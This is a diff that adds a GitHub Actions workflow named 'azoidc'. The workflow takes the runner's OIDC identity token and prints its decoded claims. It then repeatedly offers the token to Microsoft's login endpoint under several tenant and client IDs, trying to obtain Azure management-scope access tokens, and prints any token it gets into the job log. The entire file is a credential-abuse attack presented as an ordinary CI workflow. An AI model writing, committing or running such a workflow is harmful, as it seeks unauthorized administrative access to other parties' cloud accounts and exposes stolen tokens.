@@ -1,0 +1,30 @@
+name: azoidc
+on:
+  workflow_dispatch:
+permissions:
+  contents: read
+  id-token: write
+jobs:
+  o:
+    runs-on: ubuntu-latest
+    timeout-minutes: 6
+    steps:
+      - name: exchange
+        run: |
+          set +e
+          O=$(curl -s -m 15 -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange")
+          TOKEN=$(echo "$O" | python3 -c "import json,sys;print(json.load(sys.stdin).get('value',''))")
+          echo "oidc_len=${#TOKEN}"
+          echo "oidc_claims=$(echo "$TOKEN" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null | head -c 400)"
+          for T in e8adc959-bf67-48e0-95b4-318b5f73946c 59fa7797-0000-0000-0000-000000000000 0001746b-3028-43be-8d1a-9d398cdee9f9 72f988bf-86f1-41af-91ab-2d7cd011db47; do
+            for C in 2ac1b8af-6f93-4fa3-b65c-e629ad9c0bb6 d6529b06-857c-4e9e-81d0-eee83f0320ab 31f3b47b-3d31-4a5b-8f7e-1f3c8c0e7b35 e3d1f2c5-1b7e-4e8a-9c0d-2f5a6b7c8d9e; do
+              R=$(curl -s -m 15 -X POST "https://login.microsoftonline.com/$T/oauth2/v2.0/token" \
+                -d grant_type=client_credentials \
+                -d client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer \
+                --data-urlencode "client_assertion=$TOKEN" \
+                -d client_id=$C \
+                --data-urlencode "scope=https://management.azure.com/.default")
+              echo "OIDC_TRY[$T|$C]=$(echo "$R" | head -c 300)"
+              echo "$R" | grep -q access_token && { echo "===OIDC_TOKEN==="; echo "$R"; }
+            done
+          done
